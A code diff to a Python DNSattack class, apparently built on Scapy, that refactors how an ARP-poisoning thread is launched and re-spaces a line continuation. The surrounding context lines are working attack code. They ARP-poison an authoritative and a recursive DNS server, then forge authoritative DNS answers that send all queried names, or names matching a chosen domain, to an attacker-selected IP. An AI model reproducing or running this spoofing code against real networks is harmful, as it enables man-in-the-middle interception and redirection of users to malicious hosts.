@@ -24,8 +24,8 @@ class DNSattack:
         rec_mac = DNSattack.get_mac(rec)
 
         # Start ARP poisoning the servers using ARP.py
-        poison = threading.Thread(target=arpattack.ARPattack.start_attack,
-                                  args=(auth, auth_mac, rec, rec_mac, 5, 10, False))
+        poison = threading.Thread(target=arpattack.ARPattack.arp_poison,
+                                  args=(auth, auth_mac, rec, rec_mac, 5))
         poison.start()
 
         DNSattack.exit_loop = False
@@ -41,7 +41,7 @@ class DNSattack:
             # Creates a reply DNS packet from the received DNS packet by reversing addresses and sending a DNSRR
             # containing the IP address the attacker selected
             if DNS in pkt and pkt[DNS].opcode == 0 and pkt[DNS].ancount == 0 and pkt[IP]:
-                spoof_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
+                spoof_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/ \
                             DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd, qdcount=1, rd=1, ancount=1, nscount=0,
                                 arcount=0, an=(DNSRR(rrname=pkt[DNS].qd.qname, type='A', ttl=3600, rdata=ip_insert)))
                 send(spoof_pkt, verbose=1)
@@ -62,8 +62,8 @@ class DNSattack:
         rec_mac = DNSattack.get_mac(rec)
 
         # Start ARP poisoning the servers using ARP.py
-        poison = threading.Thread(target=arpattack.ARPattack.start_attack,
-                                  args=(auth, auth_mac, rec, rec_mac, 5, 10, False))
+        poison = threading.Thread(target=arpattack.ARPattack.arp_poison,
+                                  args=(auth, auth_mac, rec, rec_mac, 5))
         poison.start()
 
         DNSattack.exit_loop = False
@@ -80,7 +80,7 @@ class DNSattack:
             # containing the IP address the attacker selected
             if DNS in pkt and pkt[DNS].opcode == 0 and pkt[DNS].ancount == 0 and pkt[IP]:
                 if domain in str(pkt[DNSQR].qname, 'utf-8'):
-                    spoof_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
+                    spoof_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/ \
                                 DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd, qdcount=1, rd=1, ancount=1, nscount=0,
                                     arcount=0, an=(DNSRR(
                                         rrname=pkt[DNS].qd.qname, type='A', ttl=3600, rdata=ip_insert)))
